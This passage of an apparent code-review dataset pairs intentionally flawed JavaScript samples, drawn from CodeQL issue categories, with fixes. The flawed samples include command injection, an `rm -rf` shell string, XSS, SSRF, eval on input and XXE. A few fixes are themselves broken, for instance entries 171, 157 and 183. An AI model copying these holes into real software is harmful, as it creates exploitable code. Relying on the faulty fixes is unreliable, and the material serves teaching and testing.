        "fix": """function Rectangle(x, y, width, height) {
	this.x = x;
	this.y = y;
	this.width = width;
	this.height = height;
}"""
    },
    {
        "id": 130,
        "name": "Semicolon insertion",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-automatic-semicolon-insertion/",
        "code": """function f() {
	return
	{
		status: 'OK'
	}
}""",
        "fix": """function f() {
	return {
		status: 'OK'
	};
}"""
    },
    {
        "id": 131,
        "name": "Sensitive cookie without SameSite restrictions",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-samesite-none-cookie/",
        "code": """const http = require('http');

const server = http.createServer((req, res) => {
    res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=None`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h2>Hello world</h2>');
});""",
        "fix": """const http = require('http');

const server = http.createServer((req, res) => {
    res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=Strict`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h2>Hello world</h2>');
});"""
    },
    {
        "id": 132,
        "name": "Sensitive data read from GET request",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-sensitive-get-query/",
        "code": """const express = require('express');
const app = express();
app.use(require('body-parser').urlencoded({ extended: false }))

app.get('/login1', (req, res) => {
    const user = req.query.user;
    const password = req.query.password;
    if (checkUser(user, password)) {
        res.send('Welcome');
    } else {
        res.send('Access denied');
    }
});""",
        "fix": """const express = require('express');
const app = express();
app.use(require('body-parser').urlencoded({ extended: false }))

// good: sensitive information is read from post body
app.post('/login2', (req, res) => {
    const user = req.body.user;
    const password = req.body.password;
    if (checkUser(user, password)) {
        res.send('Welcome');
    } else {
        res.send('Access denied');
    }
});"""
    },
    {
        "id": 133,
        "name": "Sensitive server cookie exposed to the client",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-client-exposed-cookie/",
        "code": """const http = require('http');

const server = http.createServer((req, res) => {
    res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h2>Hello world</h2>');
});""",
        "fix": """const http = require('http');

const server = http.createServer((req, res) => {
    res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly`);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h2>Hello world</h2>');
});"""
    },
    {
        "id": 134,
        "name": "Server crash",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-server-crash/",
        "code": """const express = require("express"),
  fs = require("fs");

function save(rootDir, path, content) {
  if (!isValidPath(rootDir, req.query.filePath)) {
    throw new Error(`Invalid filePath: ${req.query.filePath}`);
  }
  // write content to disk
}

express().post("/save", (req, res) => {
  fs.access(rootDir, (err) => {
    if (err) {
      console.error(
        `Server setup is corrupted, ${rootDir} cannot be accessed!`
      );
      res.status(500);
      res.end();
      return;
    }
    save(rootDir, req.query.path, req.body);
    res.status(200);
    res.end();
  });
});""",
        "fix": """// ...
express().post("/save", (req, res) => {
  fs.access(rootDir, (err) => {
    // ...
    try {
      save(rootDir, req.query.path, req.body); // GOOD exception is caught below
      res.status(200);
      res.end();
    } catch (e) {
      res.status(500);
      res.end();
    }
  });
});"""
    },
    {
        "id": 135,
        "name": "Server-side URL redirect",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-server-side-unvalidated-url-redirection/",
        "code": """const app = require("express")();

app.get("/redirect", function (req, res) {
  res.redirect(req.query["target"]);
});""",
        "fix": """const app = require("express")();

const VALID_REDIRECT = "http://cwe.mitre.org/data/definitions/601.html";

app.get("/redirect", function (req, res) {
  // GOOD: the request parameter is validated against a known fixed string
  let target = req.query["target"];
  if (VALID_REDIRECT === target) {
    res.redirect(target);
  } else {
    res.redirect("/");
  }
});"""
    },
    {
        "id": 136,
        "name": "Server-side request forgery",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-request-forgery/",
        "code": """import http from 'http';

const server = http.createServer(function(req, res) {
    const target = new URL(req.url, "http://example.com").searchParams.get("target");

    http.get('https://' + target + ".example.com/data/", res => {
        // process request response ...
    });

});""",
        "fix": """import http from 'http';

const server = http.createServer(function(req, res) {
    const target = new URL(req.url, "http://example.com").searchParams.get("target");

    let subdomain;
    if (target === 'EU') {
        subdomain = "europe"
    } else {
        subdomain = "world"
    }

    // GOOD: `subdomain` is controlled by the server
    http.get('https://' + subdomain + ".example.com/data/", res => {
        // process request response ...
    });

});"""
    },
    {
        "id": 137,
        "name": "Shell command built from environment values",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-shell-command-injection-from-environment/",
        "code": """var cp = require("child_process"),
  path = require("path");
function cleanupTemp() {
  let cmd = "rm -rf " + path.join(__dirname, "temp");
  cp.execSync(cmd);
}""",
        "fix": """var cp = require("child_process"),
  path = require("path");
function cleanupTemp() {
  let cmd = "rm",
    args = ["-rf", path.join(__dirname, "temp")];
  cp.execFileSync(cmd, args); // GOOD
}"""
    },
    {
        "id": 138,
        "name": "Shift out of range",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-shift-out-of-range/",
        "code": """var x = 1<<40;""",
        "fix": """var x = Math.pow(2, 40);"""
    },
    {
        "id": 139,
        "name": "Storage of sensitive information in build artifact",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-build-artifact-leak/",
        "code": """const webpack = require("webpack");

module.exports = [{
    plugins: [
        new webpack.DefinePlugin({
            "process.env": JSON.stringify(process.env)
        })
    ]
}];""",
        "fix": """const webpack = require("webpack");

module.exports = [{
    plugins: [
        new webpack.DefinePlugin({
            'process.env': JSON.stringify({ DEBUG: process.env.DEBUG })
        })
    ]
}];"""
    },
    {
        "id": 140,
        "name": "Stored cross-site scripting",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-stored-xss/",
        "code": """var express = require('express'),
    fs = require('fs');

express().get('/list-directory', function(req, res) {
    fs.readdir('/public', function (error, fileNames) {
        var list = '<ul>';
        fileNames.forEach(fileName => {
            list += '<li>' + fileName + '</li>';
        });
        list += '</ul>'
        res.send(list);
    });
});""",
        "fix": """var express = require('express'),
    fs = require('fs'),
    escape = require('escape-html');

express().get('/list-directory', function(req, res) {
    fs.readdir('/public', function (error, fileNames) {
        var list = '<ul>';
        fileNames.forEach(fileName => {
            // GOOD: escaped `fileName` can not contain HTML elements
            list += '<li>' + escape(fileName) + '</li>';
        });
        list += '</ul>'
        res.send(list);
    });
});"""
    },
    {
        "id": 141,
        "name": "String instead of regular expression",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-string-instead-of-regex/",
        "code": """			var cleaned = input.replace("[^a-zA-Z0-9]+", "");""",
        "fix": """			var cleaned = input.replace(/[^a-zA-Z0-9]+/g, "");"""
    },
    {
        "id": 142,
        "name": "Superfluous trailing arguments",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-superfluous-trailing-arguments/",
        "code": """function f() {
	var x = 23;
	return x+19;
}

f(42);"""
    },
    {
        "id": 143,
        "name": "Suspicious method name declaration",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-suspicious-method-name-declaration/",
        "code": """declare class Point {
   x: number;
   y: number;
   constructor(x : number, y: number);
}""",
        "fix": """interface Point {
   x: number;
   y: number;
}"""
    },
    {
        "id": 144,
        "name": "Syntax error",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-syntax-error/",
        "code": """function findBox() {
  return $("box.important"""
    },
    {
        "id": 145,
        "name": "Template Object Injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-template-object-injection/",
        "code": """var app = require('express')();
app.set('view engine', 'hbs');

app.post('/', function (req, res, next) {
    var profile = req.body.profile;
    res.render('index', profile);
});""",
        "fix": """var app = require('express')();
app.set('view engine', 'hbs');

app.post('/', function (req, res, next) {
    var profile = req.body.profile;
    res.render('index', {
        name: profile.name,
        location: profile.location
    });
});"""
    },
    {
        "id": 146,
        "name": "Template syntax in string literal",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-template-syntax-in-string-literal/",
        "code": """log.info(`Connecting to ${id}`)
let connection = openConnection(id)
if (!connection) {
  log.error('Could not connect to ${id}')
}""",
        "fix": """log.info(`Connecting to ${id}`)
let connection = openConnection(id)
if (!connection) {
  log.error(`Could not connect to ${id}`)
}"""
    },
    {
        "id": 147,
        "name": "Type confusion through parameter tampering",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-type-confusion-through-parameter-tampering/",
        "code": """var app = require("express")(),
  path = require("path");

app.get("/user-files", function(req, res) {
  var file = req.param("file");
  if (file.indexOf("..") !== -1) {
    res.status(400).send("Bad request");
  } else {
    var absolute = path.resolve("/public/" + file);
    console.log("Sending file: %s", absolute);
    res.sendFile(absolute);
  }
});""",
        "fix": """var app = require("express")(),
  path = require("path");

app.get("/user-files", function(req, res) {
  var file = req.param("file");
  if (typeof file !== 'string' || file.indexOf("..") !== -1) {
    // GOOD
    // we forbid relative paths that contain ..
    // as these could leave the public directory
    res.status(400).send("Bad request");
  } else {
    var absolute = path.resolve("/public/" + file);
    console.log("Sending file: %s", absolute);
    res.sendFile(absolute);
  }
});"""
    },
    {
        "id": 149,
        "name": "Unbound event handler receiver",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unbound-event-handler-receiver/",
        "code": """class Toggle extends React.Component {
  constructor(props) {
    super(props);
    this.state = {isToggleOn: true};
  }

  handleClick() {
    this.setState(prevState => ({
      isToggleOn: !prevState.isToggleOn
    }));
  }

  render() {
    return (
      <button onClick={this.handleClick}>
        {this.state.isToggleOn ? 'ON' : 'OFF'}
      </button>
    );
  }
}""",
        "fix": """class Toggle extends React.Component {
  constructor(props) {
    super(props);
    this.state = {isToggleOn: true};

    // This binding is necessary to make `this` work in the callback
    this.handleClick = this.handleClick.bind(this);
  }

  handleClick() {
    this.setState(prevState => ({
      isToggleOn: !prevState.isToggleOn
    }));
  }

  render() {
    return (
      <button onClick={this.handleClick}> // GOOD, the constructor binds `handleClick`
        {this.state.isToggleOn ? 'ON' : 'OFF'}
      </button>
    );
  }
}"""
    },
    {
        "id": 150,
        "name": "Unclear precedence of nested operators",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unclear-operator-precedence/",
        "code": """if (x & y == 0) {
  // ...
}"""
    },
    {
        "id": 151,
        "name": "Uncontrolled command line",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-command-line-injection/",
        "code": """var cp = require("child_process"),
    http = require('http'),
    url = require('url');

var server = http.createServer(function(req, res) {
    let file = url.parse(req.url, true).query.path;

    cp.execSync(`wc -l ${file}`);
});""",
        "fix": """var cp = require("child_process"),
    http = require('http'),
    url = require('url');

var server = http.createServer(function(req, res) {
    let file = url.parse(req.url, true).query.path;

    cp.execFileSync('wc', ['-l', file]); // GOOD
});"""
    },
    {
        "id": 152,
        "name": "Uncontrolled data used in path expression",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-path-injection/",
        "code": """const fs = require('fs'),
      http = require('http'),
      url = require('url');

const ROOT = "/var/www/";

var server = http.createServer(function(req, res) {
  let filePath = url.parse(req.url, true).query.path;

  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));
});""",
        "fix": """const fs = require('fs'),
      http = require('http'),
      path = require('path'),
      url = require('url');

const ROOT = "/var/www/";

var server = http.createServer(function(req, res) {
  let filePath = url.parse(req.url, true).query.path;

  // GOOD: Verify that the file path is under the root directory
  filePath = fs.realpathSync(path.resolve(ROOT, filePath));
  if (!filePath.startsWith(ROOT)) {
    res.statusCode = 403;
    res.end();
    return;
  }
  res.write(fs.readFileSync(filePath, 'utf8'));
});"""
    },
    {
        "id": 156,
        "name": "Unnecessary use of cat process",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unnecessary-use-of-cat/",
        "code": """var child_process = require('child_process');

module.exports = function (name) {
    return child_process.execSync("cat " + name).toString();
};""",
        "fix": """var fs = require('fs');

module.exports = function (name) {
    return fs.readFileSync(name).toString();
};"""
    },
    {
        "id": 157,
        "name": "Unneeded defensive code",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unneeded-defensive-code/",
        "code": """function cleanupLater(delay, cb) {
    setTimeout(function() {
        cleanup();
        if (cb) {
            cb();
        }
    }, delay)
}

cleanupLater(1000, function(){console.log("Cleanup done")});""",
        "fix": """function cleanupLater(delay, cb) {
    setTimeout(function() {
        cleanupNow();
        // GOOD: no need to guard the invocation
        cb();
    }, delay)
}

cleanupLater(function(){console.log("Cleanup done")});"""
    },
    {
        "id": 158,
        "name": "Unreachable method overloads",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unreachable-method-overloads/",
        "code": """interface Foo {
    getParsedThing(id: string): string[];
    getParsedThing(id: string): number[];
    getParsedThing(id: string): object[];
}""",
        "fix": """interface Foo {
    getParsedThing(id: string): object[] | number[] | string[];
}"""
    },
    {
        "id": 159,
        "name": "Unreachable statement",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unreachable-statement/",
        "code": """function f() {
	if (someCond());
		return 23;
	return 42;
}""",
        "fix": """function f() {
	if (someCond())
		return 23;
	return 42;
}"""
    },
    {
        "id": 160,
        "name": "Unsafe HTML constructed from library input",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-html-constructed-from-input/",
        "code": """module.exports = function showBoldName(name) {
  document.getElementById('name').innerHTML = "<b>" + name + "</b>";
}""",
        "fix": """module.exports = function showBoldName(name) {
  const bold = document.createElement('b');
  bold.innerText = name;
  document.getElementById('name').appendChild(bold);
}"""
    },
    {
        "id": 161,
        "name": "Unsafe code constructed from library input",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unsafe-code-construction/",
        "code": """export function unsafeDeserialize(value) {
  return eval(`(${value})`);
}

export function unsafeGetter(obj, path) {
    return eval(`obj.${path}`);
}""",
        "fix": """export function safeDeserialize(value) {
  return JSON.parse(value);
}

const _ = require("lodash");
export function safeGetter(object, path) {
  return _.get(object, path);
}"""
    },
    {
        "id": 162,
        "name": "Unsafe dynamic method access",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unsafe-dynamic-method-access/",
        "code": """// API methods
function play(data) {
  // ...
}
function pause(data) {
  // ...
}

window.addEventListener("message", (ev) => {
    let message = JSON.parse(ev.data);

    // Let the parent frame call the 'play' or 'pause' function 
    window[message.name](message.payload);
});""",
        "fix": """// API methods
let api = {
  play: function(data) {
    // ...
  },
  pause: function(data) {
    // ...
  }
};

window.addEventListener("message", (ev) => {
    let message = JSON.parse(ev.data);

    // Let the parent frame call the 'play' or 'pause' function
    if (!api.hasOwnProperty(message.name)) {
      return;
    }
    api[message.name](message.payload);
});"""
    },
    {
        "id": 164,
        "name": "Unsafe jQuery plugin",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unsafe-jquery-plugin/",
        "code": """jQuery.fn.copyText = function(options) {
	
	var source = jQuery(options.sourceSelector),
	    text = source.text();
	jQuery(this).text(text);
}""",
        "fix": """jQuery.fn.copyText = function(options) {
	// GOOD may not evaluate `options.sourceSelector` as HTML
	var source = jQuery.find(options.sourceSelector),
	    text = source.text();
	jQuery(this).text(text);
}"""
    },
    {
        "id": 165,
        "name": "Unsafe shell command constructed from library input",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-shell-command-constructed-from-input/",
        "code": """var cp = require("child_process");

module.exports = function download(path, callback) {
  cp.exec("wget " + path, callback);
}""",
        "fix": """var cp = require("child_process");

module.exports = function download(path, callback) {
  cp.execFile("wget", [path], callback);
}"""
    },
    {
        "id": 166,
        "name": "Unsupported state update in lifecycle method",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-react-unsupported-state-update-in-lifecycle-method/",
        "code": """class MyComponent extends React.Component {

    constructor(props) {
        super(props)
        this.setState({
            counter: 0
        })

    }

    render() {
        return <div>{this.state.counter}</div>
    }

}""",
        "fix": """class MyComponent extends React.Component {

    constructor(props) {
        super(props)
        this.state.counter = 0;
    }

    render() {
        return <div>{this.state.counter}</div>
    }

}"""
    },
    {
        "id": 167,
        "name": "Unused index variable",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unused-index-variable/",
        "code": """function sum(xs) {
  var res = 0;
  for(var i=0; i<xs.length; ++i)
    res += xs[0];
  return res;
}""",
        "fix": """function sum(xs) {
  var res = 0;
  for(var i=0; i<xs.length; ++i)
    res += xs[i];
  return res;
}"""
    },
    {
        "id": 168,
        "name": "Unused loop iteration variable",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unused-loop-variable/",
        "code": """function countOccurrences(xs, p) {
	var count = 0;
	for (let x of xs)
		if (p())
			++count;
	return count;
}"""
    },
    {
        "id": 169,
        "name": "Unused or undefined state property",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-react-unused-or-undefined-state-property/",
        "code": """class Clock extends React.Component {
    constructor(props) {
        super(props);
        this.state = { };
    }

    render() {
        var now = this.state.date.toLocaleTimeString();
        return (
                <div>
                <h2>The time is {now}.</h2>
                </div>
        );
    }
}""",
        "fix": """class Clock extends React.Component {
    constructor(props) {
        super(props);
        this.state = { date: new Date() };
    }

    render() {
         // GOOD: this.state.date is defined above
        var now = this.state.date.toLocaleTimeString()
        return (
                <div>
                <h2>The time is {now}.</h2>
                </div>
        );
    }
}"""
    },
    {
        "id": 170,
        "name": "Unused variable, import, function or class",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unused-local-variable/",
        "code": """function f() {
	var x = expensiveComputation();
	return 23;
}"""
    },
    {
        "id": 171,
        "name": "Unvalidated dynamic method call",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-unvalidated-dynamic-method-call/",
        "code": """var express = require('express');
var app = express();

var actions = {
  play(data) {
    // ...
  },
  pause(data) {
    // ...
  }
}

app.get('/perform/:action/:payload', function(req, res) {
  let action = actions[req.params.action];
  res.end(action(req.params.payload));
});""",
        "fix": """var express = require('express');
var app = express();

var actions = new Map();
actions.set("play", function play(data) {
  // ...
});
actions.set("pause", function pause(data) {
  // ...
});

app.get('/perform/:action/:payload', function(req, res) {
  if (actions.has(req.params.action)) {
    if (typeof actions.get(req.params.action) === 'function'){
      let action = actions.get(req.params.action);
    }
    // GOOD: `action` is either the `play` or the `pause` function from above
    res.end(action(req.params.payload));
  } else {
    res.end("Unsupported action.");
  }
});"""
    },
    {
        "id": 173,
        "name": "Use of a broken or weak cryptographic algorithm",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-weak-cryptographic-algorithm/",
        "code": """const crypto = require('crypto');

var secretText = obj.getSecretText();

const desCipher = crypto.createCipher('des', key);
let desEncrypted = desCipher.write(secretText, 'utf8', 'hex');
""",
        "fix": """const crypto = require('crypto');

var secretText = obj.getSecretText();

const aesCipher = crypto.createCipher('aes-128', key);
let aesEncrypted = aesCipher.update(secretText, 'utf8', 'hex'); // GOOD: strong encryption
"""
    },
    {
        "id": 175,
        "name": "Use of call stack introspection in strict mode",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-strict-mode-call-stack-introspection/",
        "code": """var o = {
  A: function(x) {
       'use strict';
       if (!(this instanceof arguments.callee))
         return new arguments.callee(x);
       this.x = x;
     }
};""",
        "fix": """var o = {
  A: function A(x) {
       'use strict';
       if (!(this instanceof A))
         return new A(x);
       this.x = x;
     }
};"""
    },
    {
        "id": 176,
        "name": "Use of externally-controlled format string",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-tainted-format-string/",
        "code": """const app = require("express")();

app.get("unauthorized", function handler(req, res) {
  let user = req.query.user;
  let ip = req.connection.remoteAddress;
  console.log("Unauthorized access attempt by " + user, ip);
});""",
        "fix": """const app = require("express")();

app.get("unauthorized", function handler(req, res) {
  let user = req.query.user;
  let ip = req.connection.remoteAddress;
  console.log("Unauthorized access attempt by %s", user, ip);
});"""
    },
    {
        "id": 177,
        "name": "Use of for-in comprehension blocks",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-for-in-comprehension/",
        "code": """var a = [23,,42];
var desc = [for(i in a) i + " = a[" + i + "]"];""",
        "fix": """var a = [23,,42];
var desc = [for(i of Object.keys(a)) i + " = a[" + i + "]"];"""
    },
    {
        "id": 178,
        "name": "Use of incompletely initialized object",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-incomplete-object-initialization/",
        "code": """class A extends B {
  constructor() { this.x = 42; }
}""",
        "fix": """class A extends B {
  constructor() { super(); this.x = 42; }
}"""
    },
    {
        "id": 179,
        "name": "Use of password hash with insufficient computational effort",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-insufficient-password-hash/",
        "code": """const crypto = require("crypto");
function hashPassword(password) {
    var hasher = crypto.createHash('md5');
    var hashed = hasher.update(password).digest("hex");
    return hashed;
}""",
        "fix": """const bcrypt = require("bcrypt");
function hashPassword(password, salt) {
  var hashed = bcrypt.hashSync(password, salt); // GOOD
  return hashed;
}"""
    },
    {
        "id": 181,
        "name": "Use of returnless function",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-use-of-returnless-function/",
        "code": """var stage = require("./stage")

function renderText(text, id) {
    document.getElementById(id).innerText = text;
}

var text = renderText("Two households, both alike in dignity", "scene");

stage.show(text);"""
    },
    {
        "id": 182,
        "name": "Useless assignment to local variable",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-useless-assignment-to-local/",
        "code": """function f(x) {
	var result = send(x);
	waitForResponse();
	return getResponse();
}""",
        "fix": """function f(x) {
	var result = send(x);
	// check for error
	if (result === -1)
		throw new Error("send failed");
	waitForResponse();
	return getResponse();
}"""
    },
    {
        "id": 183,
        "name": "Useless assignment to property",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-useless-assignment-to-property/",
        "code": """function f(x) {
	var result = send(x);
	waitForResponse();
	return getResponse();
}""",
        "fix": """function f(x) {
	var result = send(x);
	// check for error
	if (result === -1)
		throw new Error("send failed");
	waitForResponse();
	return getResponse();
}"""
    },
    {
        "id": 184,
        "name": "Useless comparison test",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-useless-comparison-test/",
        "code": """function findValue(values, x, start, end) {
  let i;
  for (i = start; i < end; ++i) {
    if (values[i] === x) {
        return i;
    }
  }
  if (i < end) {
    return i;
  }
  return -1;
}""",
        "fix": """function findValue(values, x, start, end) {
  for (let i = start; i < end; ++i) {
    if (values[i] === x) {
        return i;
    }
  }
  return -1;
}"""
    },
    {
        "id": 185,
        "name": "Useless conditional",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-trivial-conditional/",
        "code": """function getLastLine(input) {
  var lines = [], nextLine;
  while ((nextLine = readNextLine(input)))
    lines.push(nextLine);
  if (!lines)
    throw new Error("No lines!");
  return lines[lines.length-1];
}""",
        "fix": """function getLastLine(input) {
  var lines = [], nextLine;
  while ((nextLine = readNextLine(input)))
    lines.push(nextLine);
  if (!lines.length)
    throw new Error("No lines!");
  return lines[lines.length-1];
}"""
    },
    {
        "id": 187,
        "name": "Useless return in setter",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-setter-return/",
        "code": """function Point(x, y) {
	return {
		get x() { return x; },
		set x(_x) { x = _x|0; return x; },
		get y() { return y; },
		set y(_y) { y = _y|0; return y; }
	};
}""",
        "fix": """function Point(x, y) {
	return {
		get x() { return x; },
		set x(_x) { x = _x|0; },
		get y() { return y; },
		set y(_y) { y = _y|0; }
	};
}"""
    },
    {
        "id": 188,
        "name": "Useless type test",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-useless-type-test/",
        "code": """if (typeof a === 'array')
	console.log("It's an array!");""",
        "fix": """if (Array.isArray(a))
	console.log("It's an array!");"""
    },
    {
        "id": 189,
        "name": "User-controlled bypass of security check¶",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-user-controlled-bypass/",
        "code": """var express = require('express');
var app = express();
// ...
app.get('/full-profile/:userId', function(req, res) {

    if (req.cookies.loggedInUserId !== req.params.userId) {
        requireLogin();
    } else {
        // ... show private information
    }

});""",
        "fix": """var express = require('express');
var app = express();
// ...
app.get('/full-profile/:userId', function(req, res) {

    if (req.signedCookies.loggedInUserId !== req.params.userId) {
        // GOOD: login decision made based on server controlled data
        requireLogin();
    } else {
        // ... show private information
    }

});"""
    },
    {
        "id": 190,
        "name": "Variable not declared before use",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-use-before-declaration/",
        "code": """var x = 23;

function f() {
	x = 42;
	var x;
}"""
    },
    {
        "id": 191,
        "name": "Whitespace contradicts operator precedence",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-whitespace-contradicts-precedence/",
        "code": """var a = new Array(capacity + capacity>>1);""",
        "fix": """var a = new Array(capacity + (capacity>>1));"""
    },
    {
        "id": 192,
        "name": "With statement",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-with-statement/",
        "code": """function process(record) {
	with (record) {
		addRecord(firstName + " " + lastName, email);
	}
}""",
        "fix": """function process(record) {
	addRecord(record.firstName + " " + record.lastName, record.email);
}"""
    },
    {
        "id": 193,
        "name": "Wrong use of ‘this’ for static method",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-mixed-static-instance-this-access/",
        "code": """class Foo {
    bar(){
        this.baz(42);
    }
    static baz(x){
        // ...
    }
}"""
    },
    {
        "id": 194,
        "name": "XML external entity expansion",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-xxe/",
        "code": """const app = require("express")(),
  libxml = require("libxmljs");

app.post("upload", (req, res) => {
  let xmlSrc = req.body,
    doc = libxml.parseXml(xmlSrc, { noent: true });
});""",
        "fix": """const app = require("express")(),
  libxml = require("libxmljs");

app.post("upload", (req, res) => {
  let xmlSrc = req.body,
    doc = libxml.parseXml(xmlSrc);
});"""
    },
    {
        "id": 195,
        "name": "XML internal entity expansion",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-xml-bomb/",
        "code": """const app = require("express")(),
  expat = require("node-expat");

app.post("upload", (req, res) => {
  let xmlSrc = req.body,
    parser = new expat.Parser();
  parser.on("startElement", handleStart);
  parser.on("text", handleText);
  parser.write(xmlSrc);
});""",
        "fix": """const app = require("express")(),
  sax = require("sax");

app.post("upload", (req, res) => {
  let xmlSrc = req.body,
    parser = sax.parser(true);
  parser.onopentag = handleStart;
  parser.ontext = handleText;
  parser.write(xmlSrc);
});"""
    },
    {
        "id": 196,
        "name": "XPath injection",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-xpath-injection/",
        "code": """const express = require('express');
const xpath = require('xpath');
const app = express();

app.get('/some/route', function(req, res) {
  let userName = req.param("userName");

  let badXPathExpr = xpath.parse("//users/user[login/text()='" + userName + "']/home_dir/text()");
  badXPathExpr.select({
    node: root
  });
});""",
        "fix": """const express = require('express');
const xpath = require('xpath');
const app = express();

app.get('/some/route', function(req, res) {
  let userName = req.param("userName");

  // GOOD: Embed user-provided data using variables
  let goodXPathExpr = xpath.parse("//users/user[login/text()=$userName]/home_dir/text()");
  goodXPathExpr.select({
    node: root,
    variables: { userName: userName }
  });
});"""
    },
    {
        "id": 197,
        "name": "Yield in non-generator function¶",
        "correct": False,
        "issues": [],
        "link": "https://codeql.github.com/codeql-query-help/javascript/js-yield-outside-generator/",
        "code": """function idMaker(){
    var index = 0;
    while(true)
        yield index++;
}""",
        "fix": """function* idMaker(){
    var index = 0;
    while(true)
        yield index++;
}"""
    },
    {
        "id": 198,
        "name": "Concatenating strings instead of adding numbers",
        "correct": False,
        "issues": [],
        "link": "",
        "code": """function addNumbers(num1, num2) {
    return num1 + num2;
}

let result = addNumbers("5", "7");
console.log(result);""",
        "fix": """function addNumbers(num1, num2) {
    num1 = Number(num1);
    num2 = Number(num2);
    return num1 + num2;
}

let result = addNumbers("5", "7");
console.log(result);"""
    },
    {
        "id": 201,
        "name": "Duplicate code",
        "correct": False,
        "issues": [],
        "link": "",
        "code": """#header {
    background-color: lightblue;
    color: white;
    padding: 1em;
}

#footer {
    background-color: lightgreen;
    color: black;
    padding: 1em;
}""",
        "fix": """.section-style {
    padding: 1em;
}

#header {
    @extend .section-style;
